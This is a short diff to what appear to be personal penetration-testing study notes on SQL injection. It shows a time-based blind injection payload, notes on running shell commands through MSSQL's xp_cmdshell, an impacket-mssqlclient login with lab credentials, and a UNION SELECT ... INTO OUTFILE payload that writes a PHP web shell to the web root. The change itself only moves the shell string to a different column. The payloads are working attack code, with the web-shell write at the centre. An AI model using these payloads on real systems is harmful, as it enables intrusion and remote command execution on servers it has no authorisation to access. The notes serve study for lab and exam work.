@@ -524,7 +524,6 @@ false_user' UNION SELECT SLEEP(5);--
 
 Depends on OS, service privileges, & filesystem permissions.
 
-
 ## MSSQL - *xp_cmdshell*
 - Takes a string and passes it to a cmd shell for execution.  Function returns any output as rows of text
 	- Disabled by default and must be called w/ the **EXECUTE** keyword instead of SELECT
@@ -557,7 +556,7 @@ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 ```sql
 -- Assumes 5 columns
 -- Prepend '
-UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php"-- //
+UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php"-- //
 ```
 - May return an "Uncaught TypeError" which relates to the return type and not necessarily to the writing of the file to disk
 
